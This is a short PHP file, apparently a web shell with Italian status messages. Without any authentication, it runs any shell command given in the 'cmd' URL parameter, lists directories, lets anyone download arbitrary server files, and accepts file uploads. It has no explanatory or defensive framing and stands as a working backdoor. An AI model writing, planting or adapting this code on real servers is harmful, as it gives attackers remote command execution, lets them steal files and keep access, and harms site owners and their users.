<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}

if (isset($_GET['dir'])) {
    $directory = $_GET['dir'];
    if (is_dir($directory)) {
        if ($handle = opendir($directory)) {
            echo "<pre>";
            while (($file = readdir($handle)) !== false) {
                echo "$file\n";
            }
            closedir($handle);
            echo "</pre>";
        }
    } else {
        echo "<pre>Directory non trovata.</pre>";
    }
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "<pre>File non trovato.</pre>";
    }
}

if ($_FILES) {
    $uploadDir = './uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir);
    }
    $targetFile = $uploadDir . basename($_FILES["file"]["name"]);
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $targetFile)) {
        echo "<pre>File caricato con successo: $targetFile</pre>";
    } else {
        echo "<pre>Errore nel caricamento del file.</pre>";
    }
}
?>
